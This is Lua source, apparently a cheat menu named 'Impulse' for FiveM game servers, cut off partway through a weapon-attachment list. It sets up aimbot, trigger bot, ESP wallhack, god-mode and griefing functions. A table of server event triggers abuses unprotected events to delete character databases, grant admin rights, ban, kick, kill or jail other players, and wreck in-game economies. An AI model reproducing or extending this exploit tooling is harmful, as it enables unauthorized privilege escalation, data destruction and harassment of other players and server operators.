CreateThread(function()
    local Impulse = {
        MouseX = 0,
        MouseY = 0,
        Showing = false,
        DebugMode = true,
        DrawWaterMark = true,
        ScreenW = 0,
        ScreenH = 0,
        MenuR = 255,
        MenuG = 0,
        MenuB = 0,
        RectWidth = 0.15,
        RectHeight = 0.4,
        Holding = nil,
        cooldown = 0,
        isDragging = false,
        IsClicking = false,
        IsEnterPressed = false,
        HasClicked = false,
        OpenKey = nil,
        Initialized = false,
        NotifX = 0,
        NotifY = 0,
        NotifW = 0,
        NotifH = 32,
		FOV = 0.05,
        NotifActive = true,
        Categories = {
            ["ONLINE OPTIONS"] = {show = false, x = 0.1, y = 0.092,nb = 0,Buttons = {
                {name = "All Players",func = "AllPlayers", type = 'CheckBox', isChecked = false},
            }},
            ["SELECTED PLAYERS"] = {show = false, x = 0.1, y = 0.46,nb = 0,Buttons = {
                {name = "Give All Weapons / Ban [UD]",func = "SelectedAllWeapons", type = 'Button'},
                {name = "Hydrant",func = "Hydrant", type = 'Button'},
                {name = "Explode",func = "Explode", type = 'Button'},
                {name = "Atomize [UD]",func = "Atomize", type = 'Button'},
                {name = "Teleport",func = "Teleport", type = 'Button'},
                {name = "Spawn Ennemies",func = "SpawnEnnemies", type = 'Button'},
                {name = "Spawn Particles",func = "SpawnParticles", type = 'Button'},
                {name = "Spawn Moto Cross Terrain",func = "SpawnMotoCrossTerrain", type = 'Button'},
                {name = "Spawn FootBall Goal",func = "SpawnFootBallGoal", type = 'Button'},
                {name = "Spawn Industrial Building",func = "SpawnIndustrialBuilding", type = 'Button'},
                {name = "Spawn Mass Trucks",func = "SpawnMassTrucks", type = 'Button'},
                {name = "Spawn Armed Peds / Ban All",func = "SpawnArmedPeds", type = 'Button'},
                {name = "Ram Truck",func = "RamTruck", type = 'Button'},
                {name = "Delete Vehicle [UD]",func = "DeleteAllVehs", type = 'Button'},
                {name = "Burst Tyres [UD]",func = "BurstTyres", type = 'Button'},
                {name = "AI Jack Vehicle",func = "AIJackVehicle", type = 'Button'},
                {name = "Teleport AI",func = "TeleportAI", type = 'Slide', list = {"Vehicles","Peds","Objects"}, current = 1},
            }},
            ["WEAPON OPTIONS"] = {show = false, x = 0.3, y = 0.092,nb = 0,Buttons = {
                {name = "Give Weapon By Name",func = "GiveWeaponByName", type = 'Button'},
                {name = "Give Weapon",func = "GiveWeaponSlide", type = 'Slide', list = {"WEAPON_UNARMED", "WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_MINISMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_RAYPISTOL", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_MINIGUN", "WEAPON_RAILGUN", "WEAPON_POOLCUE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL"}, current = 1},
                {name = "Give All Weapons",func = "GiveAllWeapons", type = 'Button'},
                {name = "Give All Attachments",func = "GiveAllAttachments", type = 'Button'},
                {name = "Remove All Weapons",func = "RemoveAllWeapons", type = 'Button'},
                {name = "Remove All Attachments",func = "RemoveAllAttachments", type = 'Button'},
                {name = "Refill Ammo In All Weapons",func = "RefillAll", type = 'Button'},
                {name = "Refill Ammo In Current Weapon",func = "RefillCurrent", type = 'Button'},
                {name = "Infinite Ammos",func = "InfiniteAmmos", type = 'CheckBox', isChecked = false},
                {name = "No Recoil",func = "NoRecoil", type = 'CheckBox', isChecked = false},
                {name = "No Reload",func = "NoReload", type = 'CheckBox', isChecked = false},
                {name = "Explosive Ammos",func = "ExplosiveAmmos", type = 'CheckBox', isChecked = false},
                {name = "Bullet Tracer",func = "BulletTracer", type = 'CheckBox', isChecked = false},
                {name = "Lock Head",func = "LockHead", type = 'CheckBox', isChecked = false},
                {name = "One Shot",func = "OneShotZ", type = 'CheckBox', isChecked = false},
                {name = "Aim Bot",func = "AimBot", type = 'CheckBox', isChecked = false},
                {name = "Trigger Bot",func = "TriggerBot", type = 'CheckBox', isChecked = false},
                {name = "Rage Bot",func = "RageBot", type = 'CheckBox', isChecked = false},
                {name = "Draw FOV",func = "DrawFOV", type = 'CheckBox', isChecked = false},
                {name = "Fake Lag [E]",func = "FakeLag", type = 'CheckBox', isChecked = false},
                {name = "Infinite Rolls",func = "InfiniteRoll", type = 'CheckBox', isChecked = false},
                
            }},
            ["VEHICLE OPTIONS"] = {show = false, x = 0.3, y = 0.46,nb = 0,Buttons = {
                {name = "Spawn Vehicle By Name",func = "SpawnVehicleByName", type = 'Button'},
                {name = "Full Custom",func = "FullCustom", type = 'Button'},
                {name = "Refill Fuel",func = "RefillFuel", type = 'Button'},
                {name = "Flip",func = "FlipVehicle", type = 'Button'},
                {name = "Repair",func = "RepairVehicle", type = 'Button'},
                {name = "Delete",func = "DeleteVehicle", type = 'Button'},
                {name = "Drift Mode",func = "DriftMode", type = 'CheckBox', isChecked = false},
                {name = "Better Grip",func = "BetterGrip", type = 'CheckBox', isChecked = false},
                {name = "Vroum Vroum",func = "VroumVroum", type = 'CheckBox', isChecked = false},
                {name = "Wheelie",func = "Wheelie", type = 'CheckBox', isChecked = false},
                {name = "Horn Boost [E]",func = "HornBoost", type = 'CheckBox', isChecked = false},
                {name = "Jump Vehicle [E]",func = "JumpVehicle", type = 'CheckBox', isChecked = false},
                {name = "God Mode",func = "VehGodMode", type = 'CheckBox', isChecked = false},
                {name = "Tyres GodMode",func = "VehTyresGodMode", type = 'CheckBox', isChecked = false},
                {name = "No Fall",func = "VehNoFall", type = 'CheckBox', isChecked = false},
                {name = "Invisible",func = "VehInvisible", type = 'CheckBox', isChecked = false},
                {name = "RGB Paint",func = "RGBPaint", type = 'CheckBox', isChecked = false},
            }},
            --[[ ["TROLL OPTIONS"] = {show = false, x = 800, y = 100,nb = 0,Buttons = {
            }}, ]]
            ["TRIGGERS OPTIONS"] = {show = false, x = 0.5, y = 0.092,nb = 0,Buttons = {
            }},
            ["VISUAL OPTIONS"] = {show = false, x = 0.7, y = 0.092,nb = 0,Buttons = {
                {name = "Change Weather",func = "ChangeWeather", type = 'Button'},
                {name = "Change Graphics Visuals",func = "ChangeGraphicsVisuals", type = 'Button'},
                {name = "Cross Hair",func = "CrossHair", type = 'CheckBox', isChecked = false},
                {name = "No Night",func = "NoNight", type = 'CheckBox', isChecked = false},
                {name = "No Rain",func = "NoRain", type = 'CheckBox', isChecked = false},
                {name = "Remove Clouds",func = "RemoveClouds", type = 'CheckBox', isChecked = false},
                {name = "Night Vision",func = "NightVision", type = 'CheckBox', isChecked = false},
                {name = "Thermal Vision",func = "ThermalVision", type = 'CheckBox', isChecked = false},
                {name = "Display Radar",func = "Radar", type = 'CheckBox', isChecked = false},
                {name = "ESP Lines",func = "ESPLines", type = 'CheckBox', isChecked = false},
                {name = "ESP Boxes",func = "ESPBoxes", type = 'CheckBox', isChecked = false},
                {name = "ESP Blips",func = "ESPBlips", type = 'CheckBox', isChecked = false},
                {name = "ESP Infos",func = "ESPInfos", type = 'CheckBox', isChecked = false},
                {name = "ESP Bones",func = "ESPBones", type = 'CheckBox', isChecked = false},

            }},
            ["SELF OPTIONS"] = {show = false, x = 0.5, y = 0.46,nb = 0,Buttons = {
                {name = "Revive",func = "Revive", type = 'Button'},
                {name = "Suicide",func = "Suicide", type = 'Button'},
                {name = "Refill Health",func = "RefillHealth", type = 'Button'},
                {name = "Refill Armor",func = "RefillArmor", type = 'Button'},
                {name = "Loot All Zombies",func = "KillAllZombies", type = 'Button'},
                {name = "Teleport To Way Point",func = "TeleportToWayPoint", type = 'Button'},
                {name = "Spinner XD",func = "Spinner", type = 'CheckBox', isChecked = false},
                {name = "Fake Dead",func = "FakeDead", type = 'CheckBox', isChecked = false},
                {name = "No Clip",func = "NoClip", type = 'CheckBox', isChecked = false},
                {name = "GodMode",func = "GodMode", type = 'CheckBox', isChecked = false},
                {name = "Invisible",func = "Invisible", type = 'CheckBox', isChecked = false},
                {name = "Infinite Stamina",func = "InfiniteStamina", type = 'CheckBox', isChecked = false},
                {name = "No Criticals",func = "NoCriticals", type = 'CheckBox', isChecked = false},
                {name = "No Ragdoll",func = "NoRagdoll", type = 'CheckBox', isChecked = false},
                {name = "No Screen Effects",func = "NoScreenEffects", type = 'CheckBox', isChecked = false},
                {name = "Speed Run",func = "SpeedRun", type = 'CheckBox', isChecked = false},
                {name = "Super Jump",func = "SuperJump", type = 'CheckBox', isChecked = false},
                {name = "Speed Swim",func = "SpeedSwim", type = 'CheckBox', isChecked = false},
                {name = "Moonwalk",func = "Moonwalk", type = 'CheckBox', isChecked = false},
                {name = "Shrink",func = "Shrink", type = 'CheckBox', isChecked = false},
                {name = "Auto Drive",func = "AutoDrive", type = 'CheckBox', isChecked = false},
                {name = "Anti AFK",func = "AntiAFK", type = 'CheckBox', isChecked = false},
            }},
            ["SETTINGS OPTIONS"] = {show = false, x = 0.7, y = 0.46,nb = 0,Buttons = {
                {name = "IP: "..tostring(GetCurrentServerEndpoint()),func = "", type = 'Button'},
                {name = "RGB Menu",func = "RGBMenu", type = 'CheckBox', isChecked = false},
                {name = "Menu Style",func = "MenuStyle", type = 'Slide', list = {"Red","Green","Blue"}, current = 1},
            }},
        },
        Options = {
            GodMode = false,
            Invisible = false,
            InfiniteStamina = false,
            NoCriticals = false,
            NoRagdoll = false,
            NoScreenEffects = false,
            SpeedRun = false,
            SuperJump = false,
            SpeedSwim = false,
            MoonWalk = false,
            AntiAFK = false,
            AutoDrive = false,
            NoNight = false,
            NoRain = false,
            RemoveClouds = false,
            NightVision = false,
            ThermalVision = false,
            CrossHair = false,
            Radar = false,
            ESPLines = false,
            ESPBoxes = false,
            ESPBlips = false,
            ESPInfos = false,
            ESPBones = false,
            RGBMenu = false,
            InfiniteAmmos = false,
            NoRecoil = false,
            NoReload = false,
            BulletTracer = false,
            ExplosiveAmmos = false,
            OneShotZ = false,
            NoClip = false,
            AimBot = false,
            DrawFOV = false,
			TriggerBot = false,
			Rage = false,
            AllPlayers = false,
            VroumVroum = false,
            Wheelie = false,
            VehGodMode = false,
            VehTyresGodMode = false,
            RGBPaint = false,
            VehInvisible = false,
            Spinner = false,
            FakeDead = false,
            DriftMode = false,
            JumpVehicle = false,
            HornBoost = false,
            FakeLag = false,
            InfiniteRoll = false,
            Shrink = false,
            LockHead = false,
            BetterGrip = false,
            --[[ NoScreenEffects = false,
            NoScreenEffects = false,
            NoScreenEffects = false,
            NoScreenEffects = false,
            NoScreenEffects = false, ]]
        },
        Counter = {},
        Keys = {
            ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F9"] = 56, ["F10"] = 57,["F11"] = 344, 
            ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
            ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["LEFT MOUSE"] = 18,["SCROLL BUTTON"] = 348,
            ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
            ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
            ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, 
            ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
            ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
            ["ENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
        },
        DynamicTriggers = {
            {trigger = "cmg3_animations:sync", name = "Take Hostage Selected Players", func = "TakeAllHostage"},
            {trigger = "CarryPeople:sync", name = "Carry Selected Players",  func = "CarryAll"},
            {trigger = "cmg2_animations:sync", name = "PiggyBack Selected Players",  func = "PiggyBackAll"},
            {trigger = "kashactersS:DeleteCharacter", name = "Destroy Database",  func = "DestroyDatabase"},
            {trigger = "kashactersS:DeleteCharacter", name = "Give Admin Selected Players", func =  "GiveAdminAll"},
            {trigger = "DiscordBot:playerDied", name = "Spam Server Logs", func = "SpamServerLogs"},
            {trigger = "esx-qalle-jail:jailPlayer", name = "Jail Selected Players", func = "JailAll"},
            {trigger = "esx_ambulancejob:revive", name = "Revive Selected Players", func = "ReviveAll"},
            {trigger = "esx_billing:sendBill", name = "Send Bill to everyone", func = "BillAll"},
            {trigger = "esx_communityservice:sendToCommunityService", name = "Com Serv All Players", func = "ComServAll"},
            {trigger = "esx_jail:sendToJail", name = "Jail Selected Players #2", func = "JailAll_2"},
            {trigger = "esx_jail:unjailQuest", name = "Unjail Selected Players #2", func = "UnjailAll_2"},
            {trigger = "esx_jailer:sendToJail", name = "Jail Selected Players #3", func = "JailAll_3"},
            {trigger = "esx_jailer:unjailTime", name = "Unjail Selected Players #3", func = "UnjailAll_3"},
            {trigger = "esx_policejob:handcuff", name = "Handcuff Selected Players", func = "HandcuffAll"},
            {trigger = "esx_policejob:message", name = "Message Selected Players", func = "MessageAll"},
            {trigger = "esx_society:setSocietyMoney", name = "Fuck Societies Economy", func = "FuckEconomy"},
            {trigger = "esx_vehicleshop:setVehicleOwnedPlayerId", name = "Give Vehicle Keys to All Players", func = "GiveKeysAll"},
            {trigger = "esx_vigneronjob:annonce", name = "Make an Announce", func = "MakeAnnounce"},
            {trigger = "InteractSound_SV:PlayOnAll", name = "Play Sound on Selected Players", func = "PlaySoundAll"},
            {trigger = "mellotrainer:adminKick", name = "Kick Selected Players", func = "KickAll"},
            {trigger = "mellotrainer:adminTempBan", name = "Ban Selected Players", func = "BanAll"},
            {trigger = "mellotrainer:s_adminKill", name = "Kill Selected Players", func = "KillAll"},
            {trigger = "NB:recruterplayer", name = "Set Selected Players Police", func = "SetAllPolice"},
            {trigger = "ServerValidEmote", name = "Play Emote to Selected Players", func = "EmoteAll"},
            --{trigger = "MEBjy6juCnscQrxcDzvs", name = "Open Admin Menu", func = "OpenAdminMenu"},
        },
        Attachments = {"COMPONENT_ADVANCEDRIFLE_VARMOD_LUXE","COMPONENT_CARBINERIFLE_VARMOD_LUXE","COMPONENT_ASSAULTRIFLE_VARMOD_LUXE","COMPONENT_MICROSMG_VARMOD_LUXE","COMPONENT_SAWNOFFSHOTGUN_VARMOD_LUXE","COMPONENT_SNIPERRIFLE_VARMOD_LUXE","COMPONENT_PISTOL_VARMOD_LUXE","COMPONENT_PISTOL50_VARMOD_LUXE","COMPONENT_APPISTOL_VARMOD_LUXE","COMPONENT_HEAVYPISTOL_VARMOD_LUXE","COMPONENT_SMG_VARMOD_LUXE","COMPONENT_MARKSMANRIFLE_VARMOD_LUXE","COMPONENT_COMBATPISTOL_VARMOD_LOWRIDER","COMPONENT_SPECIALCARBINE_VARMOD_LOWRIDER","COMPONENT_SNSPISTOL_VARMOD_LOWRIDER","COMPONENT_MG_COMBATMG_LOWRIDER","COMPONENT_BULLPUPRIFLE_VARMOD_LOWRIDER","COMPONENT_MG_VARMOD_LOWRIDER","COMPONENT_ASSAULTSMG_VARMOD_LOWRIDER","COMPONENT_PUMPSHOTGUN_VARMOD_LOWRIDER","COMPONENT_CARBINERIFLE_MK2_CLIP_02","COMPONENT_MARKSMANRIFLE_MK2_CLIP_02","COMPONENT_SPECIALCARBINE_MK2_CLIP_02","COMPONENT_BULLPUPRIFLE_MK2_CLIP_02","COMPONENT_HEAVYSNIPER_MK2_CLIP_02","COMPONENT_COMBATMG_MK2_CLIP_02","COMPONENT_ASSAULTRIFLE_MK2_CLIP_02","COMPONENT_SMG_MK2_CLIP_02","COMPONENT_PISTOL_MK2_CLIP_02","COMPONENT_PISTOL_CLIP_02","COMPONENT_ASSAULTSHOTGUN_CLIP_02","COMPONENT_HEAVYSHOTGUN_CLIP_02","COMPONENT_PISTOL50_CLIP_02","COMPONENT_COMBATPISTOL_CLIP_02","COMPONENT_APPISTOL_CLIP_02","COMPONENT_COMBATPDW_CLIP_02","COMPONENT_SNSPISTOL_CLIP_02","COMPONENT_SNSPISTOL_MK2_CLIP_02","COMPONENT_ASSAULTRIFLE_CLIP_02","COMPONENT_COMBATMG_CLIP_02","COMPONENT_MG_CLIP_02","COMPONENT_ASSAULTSMG_CLIP_02","COMPONENT_GUSENBERG_CLIP_02","COMPONENT_MICROSMG_CLIP_02","COMPONENT_BULLPUPRIFLE_CLIP_02","COMPONENT_COMPACTRIFLE_CLIP_02","COMPONENT_HEAVYPISTOL_CLIP_02","COMPONENT_VINTAGEPISTOL_CLIP_02","COMPONENT_CARBINERIFLE_CLIP_02","COMPONENT_ADVANCEDRIFLE_CLIP_02","COMPONENT_MARKSMANRIFLE_CLIP_02","COMPONENT_SMG_CLIP_02","COMPONENT_SPECIALCARBINE_CLIP_02","COMPONENT_SPECIALCARBINE_CLIP_03","COMPONENT_COMPACTRIFLE_CLIP_03","COMPONENT_COMBATPDW_CLIP_03","COMPONENT_ASSAULTRIFLE_CLIP_03","COMPONENT_HEAVYSHOTGUN_CLIP_03","COMPONENT_CARBINERIFLE_CLIP_03","COMPONENT_SMG_CLIP_03","COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER","COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY","COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING","COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ","COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER","COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY","COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING","COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ","COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER","COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY","COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING","COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ","COMPONENT_PISTOL_MK2_CLIP_TRACER","COMPONENT_PISTOL_MK2_CLIP_INCENDIARY","COMPONENT_PISTOL_MK2_CLIP_ARMORPIERCING","COMPONENT_PISTOL_MK2_CLIP_FMJ","COMPONENT_PUMPSHOTGUN_MK2_CLIP_TRACER","COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY","COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT","COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE","COMPONENT_SNSPISTOL_MK2_CLIP_TRACER","COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY","COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT","COMPONENT_SNSPISTOL_MK2_CLIP_FMJ","COMPONENT_REVOLVER_MK2_CLIP_TRACER","COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY","COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT","COMPONENT_REVOLVER_MK2_CLIP_FMJ","COMPONENT_SMG_MK2_CLIP_TRACER","COMPONENT_SMG_MK2_CLIP_INCENDIARY","COMPONENT_SMG_MK2_CLIP_ARMORPIERCING","COMPONENT_SMG_MK2_CLIP_FMJ","COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER","COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER","COMPONENT_COMBATMG_MK2_CLIP_TRACER","COMPONENT_HEAVYSNIPER_MK2_CLIP_TRACER","COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY","COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY","COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY","COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY","COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING","COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING","COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING","COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING","COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ","COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ","COMPONENT_COMBATMG_MK2_CLIP_FMJ","COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ","COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE","COMPONENT_AT_PI_FLSH_02","COMPONENT_AT_AR_FLSH	","COMPONENT_AT_PI_FLSH","COMPONENT_AT_AR_FLSH","COMPONENT_AT_PI_FLSH_03","COMPONENT_AT_PI_SUPP","COMPONENT_AT_PI_SUPP_02","COMPONENT_AT_AR_SUPP","COMPONENT_AT_AR_SUPP_02","COMPONENT_AT_SR_SUPP","COMPONENT_AT_SR_SUPP_03","COMPONENT_AT_PI_COMP","COMPONENT_AT_PI_COMP_02","COMPONENT_AT_PI_COMP_03","COMPONENT_AT_MRFL_BARREL_01","COMPONENT_AT_MRFL_BARREL_02","COMPONENT_AT_SR_BARREL_01","COMPONENT_AT_BP_BARREL_01","COMPONENT_AT_BP_BARREL_02","COMPONENT_AT_SC_BARREL_01","COMPONENT_AT_SC_BARREL_02","COMPONENT_AT_AR_BARREL_01","COMPONENT_AT_SB_BARREL_01","COMPONENT_AT_CR_BARREL_01","COMPONENT_AT_MG_BARREL_01","COMPONENT_AT_MG_BARREL_02","COMPONENT_AT_CR_BARREL_02","COMPONENT_AT_SR_BARREL_02","COMPONENT_AT_SB_BARREL_02","COMPONENT_AT_AR_BARREL_02","COMPONENT_AT_MUZZLE_01","COMPONENT_AT_MUZZLE_02","COMPONENT_AT_MUZZLE_03","COMPONENT_AT_MUZZLE_04","COMPONENT_AT_MUZZLE_05","COMPONENT_AT_MUZZLE_06","COMPONENT_AT_MUZZLE_07","COMPONENT_AT_AR_AFGRIP","COMPONENT_AT_AR_AFGRIP_02","COMPONENT_AT_PI_RAIL","COMPONENT_AT_SCOPE_MACRO_MK2","COMPONENT_AT_PI_RAIL_02","COMPONENT_AT_SIGHTS_SMG","COMPONENT_AT_SIGHTS","COMPONENT_AT_SCOPE_SMALL","COMPONENT_AT_SCOPE_SMALL_02","COMPONENT_AT_SCOPE_MACRO_02","COMPONENT_AT_SCOPE_SMALL_02","COMPONENT_AT_SCOPE_MACRO","COMPONENT_AT_SCOPE_MEDIUM","COMPONENT_AT_SCOPE_LARGE","COMPONENT_AT_SCOPE_SMALL","COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2","COMPONENT_AT_SCOPE_SMALL_MK2","COMPONENT_AT_SCOPE_SMALL_SMG_MK2","COMPONENT_AT_SCOPE_MEDIUM_MK2","COMPONENT_AT_SCOPE_MAX","COMPONENT_AT_SCOPE_LARGE","COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2","COMPONENT_AT_SCOPE_LARGE_MK2","COMPONENT_AT_SCOPE_NV","COMPONENT_AT_SCOPE_THERMAL","COMPONENT_KNUCKLE_VARMOD_LOVE","COMPONENT_KNUCKLE_VARMOD_DOLLAR","COMPONENT_KNUCKLE_VARMOD_VAGOS","COMPONENT_KNUCKLE_VARMOD_HATE","COMPONENT_KNUCKLE_VARMOD_DIAMOND","COMPONENT_KNUCKLE_VARMOD_PIMP","COMPONENT_KNUCKLE_VARMOD_KING","COMPONENT_KNUCKLE_VARMOD_BALLAS","COMPONENT_KNUCKLE_VARMOD_BASE","COMPONENT_SWITCHBLADE_VARMOD_VAR1","COMPONENT_SWITCHBLADE_VARMOD_VAR2","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_02","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_03","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_04","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_05","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_06","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_07","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_08","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_09","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_10","COMPONENT_MARKSMANRIFLERIFLE_MK2_CAMO_IND_01","COMPONENT_BULLPUPRIFLE_MK2_CAMO","COMPONENT_BULLPUPRIFLE_MK2_CAMO_02","COMPONENT_BULLPUPRIFLE_MK2_CAMO_03","COMPONENT_BULLPUPRIFLE_MK2_CAMO_04","COMPONENT_BULLPUPRIFLE_MK2_CAMO_05","COMPONENT_BULLPUPRIFLE_MK2_CAMO_06","COMPONENT_BULLPUPRIFLE_MK2_CAMO_07","COMPONENT_BULLPUPRIFLE_MK2_CAMO_08","COMPONENT_BULLPUPRIFLE_MK2_CAMO_09","COMPONENT_BULLPUPRIFLE_MK2_CAMO_10","COMPONENT_BULLPUPRIFLE_MK2_CAMO_IND_01","COMPONENT_PUMPSHOTGUN_MK2_CAMO","COMPONENT_PUMPSHOTGUN_MK2_CAMO_02","COMPONENT_PUMPSHOTGUN_MK2_CAMO_03","COMPONENT_PUMPSHOTGUN_MK2_CAMO_04","COMPONENT_PUMPSHOTGUN_MK2_CAMO_05","COMPONENT_PUMPSHOTGUN_MK2_CAMO_06","COMPONENT_PUMPSHOTGUN_MK2_CAMO_07","COMPONENT_PUMPSHOTGUN_MK2_CAMO_08","COMPONENT_PUMPSHOTGUN_MK2_CAMO_09","COMPONENT_PUMPSHOTGUN_MK2_CAMO_10","COMPONENT_PUMPSHOTGUN_MK2_CAMO_IND_01","COMPONENT_REVOLVER_MK2_CAMO","COMPONENT_REVOLVER_MK2_CAMO_02","COMPONENT_REVOLVER_MK2_CAMO_03","COMPONENT_REVOLVER_MK2_CAMO_04","COMPONENT_REVOLVER_MK2_CAMO_05","COMPONENT_REVOLVER_MK2_CAMO_06","COMPONENT_REVOLVER_MK2_CAMO_07","COMPONENT_REVOLVER_MK2_CAMO_08","COMPONENT_REVOLVER_MK2_CAMO_09","COMPONENT_REVOLVER_MK2_CAMO_10","COMPONENT_REVOLVER_MK2_CAMO_IND_01","COMPONENT_SPECIALCARBINE_MK2_CAMO","COMPONENT_SPECIALCARBINE_MK2_CAMO_02","COMPONENT_SPECIALCARBINE_MK2_CAMO_03","COMPONENT_SPECIALCARBINE_MK2_CAMO_04","COMPONENT_SPECIALCARBINE_MK2_CAMO_05","COMPONENT_SPECIALCARBINE_MK2_CAMO_06","COMPONENT_SPECIALCARBINE_MK2_CAMO_07","COMPONENT_SPECIALCARBINE_MK2_CAMO_08","COMPONENT_SPECIALCARBINE_MK2_CAMO_09","COMPONENT_SPECIALCARBINE_MK2_CAMO_10","COMPONENT_SPECIALCARBINE_MK2_CAMO_IND_01","COMPONENT_PISTOL_MK2_CAMO","COMPONENT_SNSPISTOL_MK2_CAMO","COMPONENT_SMG_MK2_CAMO","COMPONENT_CARBINERIFLE_MK2_CAMO","COMPONENT_ASSAULTRIFLE_MK2_CAMO","COMPONENT_COMBATMG_MK2_CAMO","COMPONENT_HEAVYSNIPER_MK2_CAMO","COMPONENT_PISTOL_MK2_CAMO_02","COMPONENT_SNSPISTOL_MK2_CAMO_02","COMPONENT_CARBINERIFLE_MK2_CAMO_02","COMPONENT_ASSAULTRIFLE_MK2_CAMO_02","COMPONENT_SMG_M